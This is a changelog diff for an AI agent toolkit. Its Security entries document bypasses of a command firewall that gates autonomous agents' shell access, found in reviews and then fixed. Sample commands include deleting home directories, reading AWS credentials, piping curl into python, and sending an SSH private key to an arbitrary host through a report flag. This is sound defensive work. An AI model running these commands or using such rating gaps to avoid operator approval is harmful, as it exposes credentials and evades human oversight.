@@ -10,6 +10,61 @@ Versions before `0.2.1-beta.0` were internal; their numbers do not correspond to
 
 ### Added
 
+- **An agent mailbox library (V5-16).** Finding: agents on the machine had no way to message each
+  other; the agent-state files report status only. Fix: `packages/core/shared/agent-mailbox.ts`, one
+  inbox per agent id beside the agent-state files. The sender and the reader must be the process
+  their agent-state file names; the recipient must exist; subject and body are redacted; messages are
+  0600, created exclusively without following links, and capped (8,000-character body, 100 messages
+  and 512 KiB per inbox); links are refused. A message is data, never an approval. Library only: the
+  tools come separately. Not covered: same-user processes can write the files directly. Verification:
+  `tests/agent-mailbox-smoke.ts` (`smoke:agent-mailbox`, in `test:security`).
+
+- **`npm run eval:roi`: tokens and USD per passed task, with a recorded baseline (V5-04).** Finding:
+  the footprint meter prices one request and the live evaluation records usage per case, but nothing
+  related spend to completed work, so a token cut could not be judged by its cost per finished task.
+  Fix: `packages/core/eval/roi.ts` reads autonomous-run ledgers (each cycle a task, passed when merged,
+  usage by cycle and role) and live evaluation output (each case a task), and prints input, cached and
+  output tokens and USD per passed task per profile. The committed fixture of five November runs
+  (33 cycles, 16 merged) is the first baseline: about 24.1 million tokens and $0.61 per merged cycle on
+  `long-horizon`; `eval:roi` fails when the fixtures and `roi-baseline.json` disagree. A live run stays
+  the operator's command. Not covered: one profile, merge as the pass signal, no fixed owner task set.
+  Verification: `tests/eval-roi-smoke.ts` (`smoke:eval-roi`).
+
+- **`/update` moves a local checkout that a pull cannot update.** Finding: for a checkout
+  registered in local mode, `/update kit` always planned `git pull --ff-only`, which cannot work
+  on a detached HEAD or on a branch with no upstream (an installed copy kept as its own git
+  worktree on its own branch); the check compared only origin's branch of the same name, so it
+  never saw a newer release, and updating meant a manual worktree move, `npm ci` and a reinstall.
+  Cause: the local path knew only "pull the tracked branch". Fix: a branch with a configured
+  upstream (any name) keeps the fast-forward pull; otherwise the check reads origin's refs and
+  reports the newest release tag and the heads of `main` and the trunk branch, offering one only
+  when the move goes forward (a release above the installed version, a branch head that descends
+  from the checkout). `/update kit` (and `/update all`) moves to the newest release,
+  `/update kit next|trunk` to a branch head, and the `/update` list offers each newer ref. The
+  plan, under one confirmation, is `git fetch` of the ref into a local tag or remote-tracking ref,
+  `git checkout --no-overwrite-ignore --detach` of its commit, `npm ci` and the checkout's own
+  installer in local mode for the recorded profile, each step verified; it never runs
+  `reset --hard`, `checkout -f` or `clean`. It refuses, naming the commands left, when tracked
+  files have uncommitted changes, a rebase, merge, cherry-pick, revert, `am` or bisect is in
+  progress, the detached HEAD holds commits no ref holds, origin is missing, unreachable, a retired
+  private source in any URL or scp form, or an address it cannot parse (never contacted), or
+  nothing is newer; a newer release whose move is refused is still reported as an update, with
+  the reason, never "up to date". Any well-formed URL or scp address that is not a retired source
+  is an ordinary remote; an address it does not cleanly understand (unparseable, git's
+  `transport::address` form, a malformed percent-escape) is not contacted, and a retired host is
+  recognised whatever its letter case or trailing dot. A kit root that is not the top level of its
+  own git checkout (a copy vendored inside another repository) gets no git command at all, so the
+  enclosing repository is never fetched, checked out or pulled. `/update undo` moves back only what the update moved: the journal now
+  records the branch (validated as a git branch name), the commit (validated as a commit id) and
+  whether the update pulled or moved. After a move it checks the branch out again, or detaches at
+  the recorded commit, and resets no branch; after a pull it resets the branch with
+  `git reset --keep`, refusing when that would drop commits only the branch holds; a journal from
+  before the branch was recorded is undone as before (`git reset --keep` on the checked-out
+  branch). Undo has the
+  same in-progress and orphaned-commit refusals. Verified by `tests/kit-update-local-smoke.ts`
+  (a real temporary origin with release tags and the trunk branch, a worktree of a clone as the
+  installed copy, one regression check per refusal); see `docs/updates.md`. Not covered: undo does
+  not rerun `npm ci`, and only a newer release raises the start-up notice.
 - **`pi-autonomy draft --preset luna-self-improve` drafts a run that improves Luna itself
   (V5-13).** Finding: a run aimed at Luna's own systems still meant choosing a template, a goal and
   Luna's gate by hand. Fix: the preset fills in the `self-improve` template, a fixed goal and the
@@ -191,6 +246,22 @@ Versions before `0.2.1-beta.0` were internal; their numbers do not correspond to
 
 ### Changed
 
+- **BREAKING: Luna no longer ships the `pi-lens` companion (V5-01).** Finding: pi-lens's 13 tools
+  added about 18,800 characters to every request in `balanced`, `long-horizon`, `self-improving` and
+  `engagement`, nearly three times `balanced`'s own tool text, and its diagnostics duplicate the
+  verify gate. Fix: it leaves `sources.json` `external` and the four profiles, and `sources.json`
+  gains a `retired` list. The next install, `/profile` switch or `/update` that re-applies a profile
+  runs `pi remove` for a retired companion only when the install marker records that Luna added it,
+  and the marker forgets it; one the user registered stays, and the installer prints the command
+  that removes it. The footprint baseline drops its pi-lens record. The autonomy image no longer
+  installs pi-lens's linters and language servers, and its entrypoint passes pi-lens's
+  `--no-autoformat --no-autofix` only when the kit it runs still registers pi-lens (pi refuses an
+  unknown flag). Not covered: an `/update` of a `custom` or `--all` install does not re-run the
+  installer, so it keeps pi-lens until the next install; the firewall entries, the web console's
+  lens panel and the control centre's lens row are separate changes. Verification:
+  `tests/install-marker-smoke.ts` (a kit-added pi-lens is removed and forgotten, a dry run removes
+  nothing, a user-added one is kept), `tests/companion-integrity-smoke.ts`,
+  `tests/profile-safety-smoke.ts`, `tests/distribution-smoke.ts`.
 - **BREAKING: Luna needs pi 1.4.0 or newer and Node.js 24 or newer (V5-27).** The
   `peerDependencies` floor moves from 0.85.1 to 1.4.0 and `engines.node` from 22.19.0 to 24.0.0 in
   every package, and the guided installer and the web console installer check Node 24. Upgrade pi
@@ -483,6 +554,76 @@ Versions before `0.2.1-beta.0` were internal; their numbers do not correspond to
   behind, and about 5,400 had built up. Tests only; no product change.
 
 ### Security
+
+- **The autonomy CLI rule never lowers a rating (DE-115, round 2).** Finding (re-review of the first round):
+  the word guard added there made `node packages/$X/autonomy/cli.ts promote --run r1 --yes` low and
+  `node "$PWD/packages/autonomy/cli.ts" pause` medium, as with a path containing a space; a stdin script
+  (`curl ... | python3 - packages/autonomy/cli.ts status`) was rated as the trusted CLI; `report`'s medium
+  rating and its token-file read applied only to a direct launch, and `--prs-file` and `--alert-state` were not
+  classified; `~-` resolved outside home, so `rm -rf ~-` and writes to `~-/.pi/agent` missed the home rules;
+  a delegated `pause *` could expand into an option. Cause: one matcher served both control detection and the
+  routine rating. Fix: a broad matcher (any word that could be the CLI, expanded or not, as the program or
+  through an interpreter or runner) only adds findings; a narrow matcher (exact, fully literal, direct, every
+  option known) alone grants the routine rating; everything else takes the ordinary rules. `~-`, `$OLDPWD` and
+  a `~+` with no known directory are read as home, the stricter class. A delegated call with an unquoted glob
+  or brace word is decided as usual. Authority change: for operator review. Verification:
+  `tests/firewall-shell-smoke.ts` (a property over 700 launch forms and commands: never lower than without the
+  rule, every control command high; and the named rows), `tests/firewall-delegation-smoke.ts`; each of 22
+  guards was reverted and its test failed.
+
+- **Review fixes for the autonomy CLI rules and operator delegation (DE-115).** Finding (independent
+  review of F-02 part 2 and DE-114): `node -e "...//pi-autonomy"` and `python3 -c "...#/pi-autonomy"` ran
+  arbitrary code rated as the autonomy CLI's routine `status` (low); `/tmp/x/pi-autonomy status` was low
+  by its name alone; `up`, `inbox --answer`, `backlog` and `board` changes were not control commands, and
+  `pi-autonomy report --ntfy-token-file ~/.ssh/id_ed25519 --ntfy-url <any host>` sent a credential file
+  rated low; `cat ~-/.aws/credentials` lost its credential read; delegation allowed `resume` (which can
+  approve or start a run), `answer`, `raise-budget`, `restart`, `units`, `tick` and `board-push`, with
+  any option, so `resume --approve` was delegable; `firewall.json` at a `PI_KIT_FIREWALL_CONFIG` path was
+  not protected, and a delegation change left no audit record. Cause: the CLI was matched by suffix in any
+  operand, including inline code; control was a deny list; option values were not classified; `~-` resolved
+  to nothing; the delegable set was too wide and only the first argument was checked. Fix: inline code is
+  never the CLI and a word with spaces or shell punctuation is never a path to it; its routine and medium
+  ratings apply only to `pi-autonomy` by name or the workspace's CLI script; the CLI's commands are an
+  allow list (reading routine; `report`, `key-limit`, `export`, `doctor --setup`, `boundary --probe`
+  medium; everything else, unknown commands included, control); `--config`, `--file`,
+  `--ntfy-token-file`, `--spec-file` and `--repo` values are reads and `--out` a write; `~-` (and `~+`
+  with no known directory) resolve under a placeholder outside every workspace; delegation covers only
+  `status`, `pause`, `steer`, `backlog` and `metrics`, never with an option, with the grant-like verbs
+  never delegable; the program must be the whole first word; `firewall.json` joins the protected boundary
+  and each change of the delegations is audited as `delegations_changed`. Authority change: for operator
+  review. Verification: `tests/firewall-shell-smoke.ts`, `tests/firewall-delegation-smoke.ts`,
+  `tests/firewall-unattended-smoke.ts`; each of the 16 guards was reverted and its test failed.
+
+- **Naming the autonomy CLI no longer makes a package command routine (DE-114).** Finding: since the
+  previous change to the autonomy CLI's control commands, `npm install left-pad pi-autonomy`, `npx left-pad
+  pi-autonomy` and `npx pi-autonomy status` were low instead of medium (install, or fetch and run), and
+  `npx -p pi-autonomy pi-autonomy pause` ran unasked; `node /opt/x/evil.js pi-autonomy status` had been low
+  before that. Cause: the CLI was matched in any argument after an interpreter or a package runner, and its
+  reading commands were rated low before the package rules ran. Fix: the CLI is recognised only as the program
+  a command runs (a runner's first operand after its options and `--`, or an interpreter's script, also behind
+  `npx tsx`); its reading commands are routine only when run by name, directly or by an interpreter, and a
+  control command still asks however it is reached. Verification: `tests/firewall-shell-smoke.ts`.
+
+- **The operator can delegate named autonomy-control verbs to one program (F-02, part 2).** Finding: the
+  firewall had no way to express the owner's delegation of day-to-day run control to the manager session:
+  every `pause`, `steer` or `status` through the operator's wrapper opened an approval card (10 high
+  escalations, 9 prompts and 1,460 s of waiting in one 189-call session), and the wrapper passed only when
+  its text happened to be opaque to the classifier. Cause: `command_rules` can only deny or ask, and session
+  grants are exact-hash approvals, not delegations. Fix: a `delegations` entry in `firewall.json` names the
+  operator, the delegate program's real path, the verbs and an expiry (at most 90 days ahead); a bash call
+  that is one plain command of a listed verb of that program runs without a prompt in a root session under
+  the coding policy, and is audited as `decider: "delegate"` with the operator, path, verb and expiry. It
+  writes no feedback or approval. Never-delegable verbs, the raw autonomy CLI, `systemctl enable`, any other
+  program, chains, redirects, wrappers, and unattended, child, engagement and strict sessions still need the
+  operator; a malformed, expired, linked, foreign-owned or group-writable entry is dropped with a warning in
+  `/firewall status`. The delegate joins the protected boundary (every configured path, so a dropped entry's
+  delegate cannot be replaced and trusted again), running any protected file as a program or as an
+  interpreter's script is now medium (`protected_exec`) instead of low, and the classifier expands `~+` and
+  `~-` as bash does instead of reading them as relative paths; a `~user/` program never matches a delegation.
+  An adversarial review found these gaps (and two entries for one path honouring only the first) before it
+  landed. Authority change: for operator review before it reaches
+  `integration/luna`. Not covered: what the delegate itself does with a verb. Verification:
+  `tests/firewall-delegation-smoke.ts` (both sides, in `test:security`).
 
 - **The autonomy CLI's control commands ask the operator however the CLI is reached.** Finding: `pause`,
   `steer`, `start` and the other control commands are high and never learned from an agent's shell, but only
